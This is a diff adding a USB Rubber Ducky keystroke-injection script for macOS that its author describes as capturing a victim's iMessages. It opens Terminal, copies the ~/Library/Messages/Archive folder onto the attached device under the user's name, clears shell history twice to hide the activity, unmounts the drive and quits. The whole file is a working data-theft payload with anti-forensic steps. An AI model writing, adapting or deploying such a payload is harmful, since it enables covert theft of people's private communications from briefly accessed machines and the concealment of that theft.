@@ -1,0 +1,27 @@
+REM Author: Alex Jay (Minecracker627) (5A13X99)
+
+REM This script captures iMessages and puts it into 
+REM a folder named automatically to the victims username
+DELAY 500
+GUI SPACE
+DELAY 150
+STRING Terminal
+ENTER
+DELAY 300
+STRING cp -r ~/Library/Messages/Archive /Volumes/RubberDucky/$USER/
+ENTER
+STRING history -c
+ENTER
+STRING diskutil umount /Volumes/RubberDucky
+ENTER
+DELAY 500
+STRING history -c
+ENTER
+STRING echo 5A13X99
+ENTER
+DELAY 1000
+STRING exit
+ENTER
+DELAY 250
+GUI q
+
